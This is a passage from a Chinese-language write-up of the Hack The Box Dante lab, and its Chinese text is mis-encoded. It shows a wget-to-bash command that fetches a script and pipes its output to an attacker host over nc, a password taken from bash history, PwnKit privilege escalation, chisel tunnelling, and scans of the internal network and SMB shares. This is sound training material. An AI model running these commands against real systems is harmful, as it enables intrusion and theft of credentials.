bash &lt;<span class="o">(</span>wget <span class="nt">-q</span> <span class="nt">-O</span> - <span class="s2">"http://10.10.14.5:9999/lse_cve.sh"</span><span class="o">)</span> <span class="nt">-l1</span> <span class="nt">-i</span> | nc 10.10.14.5 9002 <span class="c">#Victim</span>

bash &lt;<span class="o">(</span>wget <span class="nt">-q</span> <span class="nt">-O</span> - <span class="s2">"http://10.10.14.5:9999/lse_cve.sh"</span><span class="o">)</span> <span class="nt">-l2</span> <span class="nt">-i</span> | nc 10.10.14.5 9002 <span class="c">#Victim</span>
</code></pre></div></div>

<p>é™¤äº† james ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ª balthazar ç”¨æˆ·ã€‚linPEAS åœ¨ james çš„ bash_history æ–‡ä»¶ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªå¯†ç ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords <span class="k">in </span><span class="nb">history </span>files
/home/james/.bash_history:rm .mysql_history
/home/james/.bash_history:mysql <span class="nt">-u</span> balthazar <span class="nt">-p</span> TheJoker12345!
</code></pre></div></div>
<p>ä½¿ç”¨è¯¥å¯†ç å¯ä»¥æ­£å¸¸ç™»é™† sshï¼Œç»“åˆå‰é¢ä½¿ç”¨ linPEAS çš„ç»“æœï¼Œç›®æ ‡å­˜åœ¨å¤šä¸ªææƒæ¼æ´ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] <span class="o">[</span>CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=(</span>20.04<span class="o">)</span> <span class="o">]{</span>kernel:5.12.13<span class="o">}</span>
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone<span class="o">=</span>1 required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>10|11|12|13|14|15|16|17|18|19|20|21 <span class="o">]</span>,debian<span class="o">=</span>7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: <span class="nv">mint</span><span class="o">=</span>19,[ <span class="nv">ubuntu</span><span class="o">=</span>18|20 <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: <span class="nv">centos</span><span class="o">=</span>6|7|8,[ <span class="nv">ubuntu</span><span class="o">=</span>14|16|17|18|19|20 <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>20.04 <span class="o">]{</span>kernel:5.8.0-<span class="k">*</span><span class="o">}</span>
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

<span class="o">[</span>+] <span class="o">[</span>CVE-2022-32250] nft_object UAF <span class="o">(</span>NFT_MSG_NEWSET<span class="o">)</span>

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=(</span>22.04<span class="o">){</span>kernel:5.15.0-27-generic<span class="o">}</span>
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone<span class="o">=</span>1 required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>
</code></pre></div></div>
<p>ä½¿ç”¨ Pwnkit å¯ä»¥æˆåŠŸææƒåˆ° rootï¼Œä»è€Œå¯ä»¥è¯»å– james çš„ flagã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>balthazar@DANTE-WEB-NIX01:~/Downloads/.tmp<span class="nv">$ </span>./PwnKit 
root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp# <span class="nb">whoami
</span>root
root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp# <span class="nb">cat</span> /home/james/flag.txt 
DANTE<span class="o">{</span>j4m3s_NEEd5_a_p455w0rd_M4n4ger!<span class="o">}</span>
root@DANTE-WEB-NIX01:/home/balthazar/Downloads/.tmp#
</code></pre></div></div>
<p>root ç›®å½•ä¸‹ä¹Ÿæœ‰ä¸€ä¸ª flag.txt</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DANTE-WEB-NIX01:~# <span class="nb">ls
</span>flag.txt  snap  wordpress.tar.bz2  wordpress_backup
root@DANTE-WEB-NIX01:~# <span class="nb">cat </span>flag.txt 
DANTE<span class="o">{</span>Too_much_Pr1v!!!!<span class="o">}</span>
</code></pre></div></div>

<h2 id="tunnel-æ­å»º">Tunnel æ­å»º</h2>

<h3 id="chisel">chisel</h3>
<p>ä½¿ç”¨ pwncat-cs è¿æ¥ sshï¼Œä¸Šä¼  chisel</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwncat-cs <span class="s1">'ssh://balthazar:TheJoker12345!@10.10.110.100'</span>
upload chisel xxx
</code></pre></div></div>

<p>é¦–å…ˆä½¿ç”¨ chisel æ„å»º socks éš§é“ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel server <span class="nt">-p</span> 12345 <span class="nt">--reverse</span> <span class="c"># local</span>
./chisel client 10.10.14.5:12345 R:0.0.0.0:1080:socks <span class="c"># remote</span>
</code></pre></div></div>
<h3 id="msf">msf</h3>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ msf meterpreter æ¥æ„å»º socks éš§é“ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use multi/manage/autoroute
<span class="nb">set </span>session 1
exploit
use auxiliary/server/socks_proxy
<span class="nb">set </span>SRVPORT 9090
exlpoit <span class="nt">-j</span>
</code></pre></div></div>

<h2 id="å†…ç½‘èµ„äº§æ‰«æ">å†…ç½‘èµ„äº§æ‰«æ</h2>
<p>åœ¨å»ºç«‹äº†éš§é“çš„åŸºç¡€ä¸Šå°±å¯ä»¥å¯¹å†…ç½‘è¿›è¡Œèµ„äº§æ‰«æäº†</p>
<h3 id="fscan-1">fscan</h3>
<p>æ¯”è¾ƒé«˜æ•ˆçš„æ˜¯ fscanï¼Œé…åˆ fscanOutPut å¯ä»¥å°†ç»“æœä»¥è¡¨æ ¼çš„æ–¹å¼è¿›è¡Œç»Ÿè®¡ã€‚fscan æ”¯æŒ -socks5 å‚æ•°æ¥æŒ‡å®šä»£ç†ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fscan <span class="nt">-h</span> 172.16.1.0/24 <span class="nt">-socks5</span> 127.0.0.1:1080
</code></pre></div></div>

<h3 id="goby">Goby</h3>
<p>Goby çš„å›¾å½¢åŒ–ç•Œé¢æ›´åŠ æ–¹ä¾¿åˆ†æã€‚ä»£ç†æ‰«ææ—¶ï¼Œä½¿ç”¨ socks ä»£ç†ã€‚</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102075033.png" alt="20240102075033"></p>

<!-- ![Alt text](../../../../../assets/image-2.png) -->

<p>æ€»å…± 11 ä¸ª IPï¼ŒåŒæ ·ä¹Ÿæ‰«æå‡ºäº† MS17-010</p>

<h3 id="ehole-æŒ‡çº¹è¯†åˆ«">Ehole: æŒ‡çº¹è¯†åˆ«</h3>
<p>ehole å¯ä»¥å¯¹ web æœåŠ¡è¿›è¡Œè¿›ä¸€æ­¥çš„æŒ‡çº¹æ‰«æï¼ŒåŒæ ·æ”¯æŒ -socks å‚æ•°è¿›è¡Œä»£ç†æ‰«æã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ehole finger <span class="nt">-l</span> webapp.txt <span class="nt">--proxy</span> socks5://127.0.0.1:1080
</code></pre></div></div>
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102075044.png" alt="20240102075044"></p>

<!-- ![Alt text](../../../../../assets/image-4.png) -->
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span> https://172.16.1.1 |  | nginx | 200 | 8889 | pfSense - LoginpfSense Logo <span class="o">]</span>
<span class="o">[</span> https://172.16.1.1/ |  | nginx | 200 | 8889 | pfSense - LoginpfSense Logo <span class="o">]</span>
<span class="o">[</span> http://172.16.1.1 |  | nginx | 200 | 8999 | pfSense - LoginpfSense Logo <span class="o">]</span>
<span class="o">[</span> http://172.16.1.102 | OpenSSL | Apache/2.4.54 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1p PHP/7.4.0 | 200 | 1237 | Dante Marriage Registration System :: Home Page <span class="o">]</span>                                                                                       
<span class="o">[</span> http://172.16.1.19 | åˆ—ç›®å½• | Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> | 200 | 553 | Index of / <span class="o">]</span>
<span class="o">[</span> http://172.16.1.12/dashboard/ | XAMPP é»˜è®¤é¡µé¢,Perl,rums<span class="o">(</span>ç§‘åˆ›ç«™ç¾¤ç®¡ç†å¹³å°<span class="o">)</span>,mod_perl,OpenSSL | Apache/2.4.43 <span class="o">(</span>Unix<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP <span class="o">]</span>                            
<span class="o">[</span> http://172.16.1.17 | åˆ—ç›®å½• | Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> | 200 | 963 | Index of / <span class="o">]</span>
<span class="o">[</span> http://172.16.1.20 |  | Microsoft-IIS/8.5 | 200 | 3173 |  <span class="o">]</span>
<span class="o">[</span> http://172.16.1.100 | Apache2 Ubuntu é»˜è®¤é¡µ | Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> | 200 | 10918 | Apache2 Ubuntu Default Page: It works <span class="o">]</span>                                                                                                          
<span class="o">[</span> http://172.16.1.13/dashboard/ | XAMPP é»˜è®¤é¡µé¢,rums<span class="o">(</span>ç§‘åˆ›ç«™ç¾¤ç®¡ç†å¹³å°<span class="o">)</span>,OpenSSL | Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP <span class="o">]</span>                                                                      
<span class="o">[</span> http://172.16.1.10 | wordpress | Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span> | 200 | 28842 | Dante Hosting <span class="o">]</span>
<span class="o">[</span> https://172.16.1.102 | OpenSSL | Apache/2.4.54 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1p PHP/7.4.0 | 200 | 1237 | Dante Marriage Registration System :: Home Page <span class="o">]</span>                                                                                      
<span class="o">[</span> https://172.16.1.13/dashboard/ | XAMPP é»˜è®¤é¡µé¢,rums<span class="o">(</span>ç§‘åˆ›ç«™ç¾¤ç®¡ç†å¹³å°<span class="o">)</span>,OpenSSL | Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP <span class="o">]</span>                                                                     
<span class="o">[</span> https://172.16.1.12/dashboard/ | XAMPP é»˜è®¤é¡µé¢,Perl,rums<span class="o">(</span>ç§‘åˆ›ç«™ç¾¤ç®¡ç†å¹³å°<span class="o">)</span>,mod_perl,OpenSSL | Apache/2.4.43 <span class="o">(</span>Unix<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP <span class="o">]</span>                           
<span class="o">[</span> http://172.16.1.12 | XAMPP é»˜è®¤é¡µé¢,Perl,rums<span class="o">(</span>ç§‘åˆ›ç«™ç¾¤ç®¡ç†å¹³å°<span class="o">)</span>,mod_perl,OpenSSL | Apache/2.4.43 <span class="o">(</span>Unix<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP <span class="o">]</span>                                       
<span class="o">[</span> http://172.16.1.13 | XAMPP é»˜è®¤é¡µé¢,rums<span class="o">(</span>ç§‘åˆ›ç«™ç¾¤ç®¡ç†å¹³å°<span class="o">)</span>,OpenSSL | Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP <span class="o">]</span>                                                                                 
<span class="o">[</span> https://172.16.1.13 | XAMPP é»˜è®¤é¡µé¢,rums<span class="o">(</span>ç§‘åˆ›ç«™ç¾¤ç®¡ç†å¹³å°<span class="o">)</span>,OpenSSL | Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 | 200 | 7576 | Welcome to XAMPP <span class="o">]</span>                                                                                
<span class="o">[</span> https://172.16.1.12 | XAMPP é»˜è®¤é¡µé¢,Perl,rums<span class="o">(</span>ç§‘åˆ›ç«™ç¾¤ç®¡ç†å¹³å°<span class="o">)</span>,mod_perl,OpenSSL | Apache/2.4.43 <span class="o">(</span>Unix<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3 | 200 | 7574 | Welcome to XAMPP <span class="o">]</span>                                      
<span class="o">[</span> http://172.16.1.19:8080 | Jenkins,Hudson,Jenkins | Jetty<span class="o">(</span>9.4.27.v20200227<span class="o">)</span> | 403 | 793 |  <span class="o">]</span>
<span class="o">[</span> http://172.16.1.19:8080/login?from<span class="o">=</span>%2F<span class="s1">' | Jenkins,Hudson,Jenkins | Jetty(9.4.27.v20200227) | 200 | 2019 | Sign in [Jenkins] ]  
</span></code></pre></div></div>

<h3 id="èµ„äº§æ¦‚å†µ">èµ„äº§æ¦‚å†µ</h3>

<p>å­˜æ´» IP åŠç«¯å£ï¼š</p>
<ul>
  <li>172.16.1.5 
    172.16.1.5  21
    172.16.1.5	135
    172.16.1.5	139
    172.16.1.5	445
    172.16.1.5	1433</li>
  <li>172.16.1.13
    172.16.1.13	80
    172.16.1.13	443
    172.16.1.13	445</li>
  <li>
    <p>172.16.1.102
    172.16.1.102	80
    172.16.1.102	135
    172.16.1.102	139
    172.16.1.102	443
    172.16.1.102	445
    172.16.1.102	3306</p>
  </li>
  <li>172.16.1.10
    172.16.1.10	22
    172.16.1.10	80
    172.16.1.10	139
    172.16.1.10	445</li>
  <li>172.16.1.17
    172.16.1.17	80
    172.16.1.17	139
    172.16.1.17	445
    172.16.1.17	10000</li>
  <li>172.16.1.101
    172.16.1.101	21
    172.16.1.101	135
    172.16.1.101	139
    172.16.1.101	445</li>
  <li>172.16.1.3	
    172.16.1.3	22</li>
  <li>172.16.1.20
    172.16.1.20	80
    172.16.1.20	22
    172.16.1.20	135
    172.16.1.20	139
    172.16.1.20	443
    172.16.1.20	445
    172.16.1.20	88</li>
  <li>
    <p>172.16.1.19
    172.16.1.19	80
    172.16.1.19	8080
    172.16.1.19	8443
    172.16.1.19	8888</p>
  </li>
  <li>172.16.1.12
    172.16.1.12	21
    172.16.1.12	80
    172.16.1.12	22
    172.16.1.12	443
    172.16.1.12	3306</li>
  <li>172.16.1.1
    172.16.1.1	22
    172.16.1.1	80
    172.16.1.1	443</li>
  <li>172.16.1.100
    172.16.1.100	22
    172.16.1.100	21
    172.16.1.100	80</li>
  <li>10.10.110.100
    10.10.110.100	21
    10.10.110.100	22</li>
</ul>

<h1 id="æ— å‡­è¯åŸŸå†…ä¿¡æ¯æ”¶é›†">æ— å‡­è¯åŸŸå†…ä¿¡æ¯æ”¶é›†</h1>
<ol>
  <li>cme æ”¶é›† SMB åŠåŸŸä¿¡æ¯ã€‚</li>
  <li>å®šä½åŸŸæ§</li>
  <li>å¯»æ‰¾åŸŸå†…ç”¨æˆ·å</li>
  <li>æ˜¯å¦å¯ä»¥åŒ¿åæšä¸¾ SMBã€FTP ç­‰</li>
  <li>ASREProast</li>
  <li>Password Spray</li>
  <li>åŒ¿åæšä¸¾ ftp</li>
</ol>

<h2 id="cme-æ”¶é›†-smb-åŠåŸŸä¿¡æ¯">cme æ”¶é›† SMB åŠåŸŸä¿¡æ¯</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p crackmapexec smb 172.16.1.0/24
</code></pre></div></div>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         172.16.1.5      445    DANTE-SQL01      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:DANTE-SQL01<span class="o">)</span> <span class="o">(</span>domain:DANTE-SQL01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         172.16.1.20     445    DANTE-DC01       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2012 R2 Standard 9600 x64 <span class="o">(</span>name:DANTE-DC01<span class="o">)</span> <span class="o">(</span>domain:DANTE.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         172.16.1.10     445    DANTE-NIX02      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 0 <span class="o">(</span>name:DANTE-NIX02<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.17     445    DANTE-NIX03      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 0 <span class="o">(</span>name:DANTE-NIX03<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:DANTE-WS02<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS02<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.102    445    DANTE-WS03       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 19041 x64 <span class="o">(</span>name:DANTE-WS03<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS03<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.13     445    DANTE-WS01       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 <span class="o">(</span>name:DANTE-WS01<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>
<p>ä»ç»“æœä¸­å¯ä»¥çœ‹åˆ°å­˜åœ¨ DANTE.local åŸŸï¼Œå¹¶ä¸” DC ä¸º 172.16.1.20ã€‚</p>
<ol>
  <li>å‰é¢çš„æ¢æµ‹ç»“æœä¸­å¯çŸ¥ DC ä¸Šå­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´ã€‚</li>
  <li>é™¤äº† DC ä¹‹å¤–ï¼Œå…¶ä»–çš„ä¸»æœºå‡æœªå¼€å¯ SMB å¼ºåˆ¶ç­¾åï¼Œå­˜åœ¨ Relay çš„å¯èƒ½æ€§ã€‚</li>
</ol>

<h2 id="åŒ¿åæšä¸¾ç”¨æˆ·å">åŒ¿åæšä¸¾ç”¨æˆ·å</h2>
<p>åŒ¿åæšä¸¾ç”¨æˆ·åå¯ä»¥ä½¿ç”¨ cme æˆ–è€… enum4linuxã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p crackmapexec smb 172.16.1.20 <span class="nt">--users</span>

p enum4linux 172.16.1.20 
</code></pre></div></div>
<p>éœ€è¦è®¤è¯ï¼Œå› æ­¤æ²¡æœ‰å¾—åˆ°ç»“æœã€‚</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â””â”€$ p crackmapexec smb 172.16.1.20 --users
[proxychains] config file found: /mnt/share/project/HTB/ProLab/Dante/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
SMB         172.16.1.20     445    DANTE-DC01       [*] Windows Server 2012 R2 Standard 9600 x64 (name:DANTE-DC01) (domain:DANTE.local) (signing:True) (SMBv1:True)
SMB         172.16.1.20     445    DANTE-DC01       [-] Error enumerating domain users using dc ip 172.16.1.20: NTLM needs domain\username and a password
SMB         172.16.1.20     445    DANTE-DC01       [*] Trying with SAMRPC protocol
</code></pre></div></div>

<h2 id="åŒ¿åæšä¸¾-smb">åŒ¿åæšä¸¾ SMB</h2>
<p>å¦‚æœ SMB å…è®¸åŒ¿åè®¿é—®ï¼Œæˆ‘ä»¬æ²¡å‡†å¯ä»¥è·å–ä¸€äº›æ•æ„Ÿæ¶ˆæ¯ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p crackmapexec smb 172.16.1.0/24 <span class="nt">-u</span> anonymous <span class="nt">-p</span> <span class="s1">''</span>  <span class="nt">--shares</span>
</code></pre></div></div>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         172.16.1.5      445    DANTE-SQL01      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:DANTE-SQL01<span class="o">)</span> <span class="o">(</span>domain:DANTE-SQL01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         172.16.1.20     445    DANTE-DC01       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2012 R2 Standard 9600 x64 <span class="o">(</span>name:DANTE-DC01<span class="o">)</span> <span class="o">(</span>domain:DANTE.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         172.16.1.10     445    DANTE-NIX02      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 0 <span class="o">(</span>name:DANTE-NIX02<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.17     445    DANTE-NIX03      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 0 <span class="o">(</span>name:DANTE-NIX03<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.5      445    DANTE-SQL01      <span class="o">[</span>-] DANTE-SQL01<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.102    445    DANTE-WS03       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 19041 x64 <span class="o">(</span>name:DANTE-WS03<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS03<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:DANTE-WS02<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS02<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.20     445    DANTE-DC01       <span class="o">[</span>-] DANTE.local<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.10     445    DANTE-NIX02      <span class="o">[</span>+] <span class="se">\a</span>nonymous: 
SMB         172.16.1.17     445    DANTE-NIX03      <span class="o">[</span>+] <span class="se">\a</span>nonymous: 
SMB         172.16.1.10     445    DANTE-NIX02      <span class="o">[</span>+] Enumerated shares
SMB         172.16.1.10     445    DANTE-NIX02      Share           Permissions     Remark
SMB         172.16.1.10     445    DANTE-NIX02      <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         172.16.1.10     445    DANTE-NIX02      print<span class="nv">$ </span>                         Printer Drivers
SMB         172.16.1.10     445    DANTE-NIX02      SlackMigration  READ            
SMB         172.16.1.10     445    DANTE-NIX02      IPC<span class="nv">$ </span>                           IPC Service <span class="o">(</span>DANTE-NIX02 server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>                                                                                                                    
SMB         172.16.1.13     445    DANTE-WS01       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 <span class="o">(</span>name:DANTE-WS01<span class="o">)</span> <span class="o">(</span>domain:DANTE-WS01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.102    445    DANTE-WS03       <span class="o">[</span>-] DANTE-WS03<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    DANTE-WS02       <span class="o">[</span>-] DANTE-WS02<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
SMB         172.16.1.17     445    DANTE-NIX03      <span class="o">[</span>+] Enumerated shares
SMB         172.16.1.17     445    DANTE-NIX03      Share           Permissions     Remark
SMB         172.16.1.17     445    DANTE-NIX03      <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         172.16.1.17     445    DANTE-NIX03      forensics       READ,WRITE      
SMB         172.16.1.17     445    DANTE-NIX03      IPC<span class="nv">$ </span>                           IPC Service <span class="o">(</span>DANTE-NIX03 server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>                                                                                                                    
SMB         172.16.1.13     445    DANTE-WS01       <span class="o">[</span>-] DANTE-WS01<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
</code></pre></div></div>
<p>å…è®¸ SMB åŒ¿åè®¿é—®çš„æœ‰ä¸¤å°ä¸»æœºï¼š</p>
<ol>
  <li>172.16.1.10 SlackMigration å¯è¯»</li>
  <li>172.16.1.17 forensics å¯è¯»å¯å†™</li>
</ol>

<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ smbclient è¿›è¡Œè¿æ¥ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p smbclient <span class="se">\\\\</span>172.16.1.10<span class="se">\\</span>SlackMigration <span class="nt">-U</span> <span class="s2">"anonymous%"</span>
</code></pre></div></div>
<p>172.16.1.10 ä¸­ SlackMigration å…±äº«ä¸­å­˜åœ¨ä¸€ä¸ª admintasks.txt æ–‡ä»¶ï¼Œç›¸å½“äºæç¤ºä¿¡æ¯ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-Remove</span> wordpress <span class="nb">install </span>from web root - PENDING
<span class="nt">-Reinstate</span> Slack integration on Ubuntu machine - PENDING
<span class="nt">-Remove</span> old employee accounts - COMPLETE
<span class="nt">-Inform</span> Margaret of the new changes - COMPLETE
<span class="nt">-Remove</span> account restrictions on Margarets account post-promotion to admin - PENDING
</code></pre></div></div>
<p>ä»ä¸­æˆ‘ä»¬å¯ä»¥å¾—å‡ºå¦‚ä¸‹çš„ä¿¡æ¯ï¼š</p>
<ul>
  <li>172.16.1.10 ä¸­éƒ¨ç½²çš„ wordpress æœåŠ¡ä»¥ root æƒé™è¿è¡Œã€‚</li>
  <li>ç”¨æˆ· Margarets å…·å¤‡ç®¡ç†å‘˜æƒé™ã€‚</li>
</ul>

<p>è¿æ¥ 172.16.1.17 forensics</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p smbclient <span class="se">\\\\</span>172.16.1.17<span class="se">\\</span>forensics <span class="nt">-U</span> <span class="s2">"anonymous%"</span>
</code></pre></div></div>
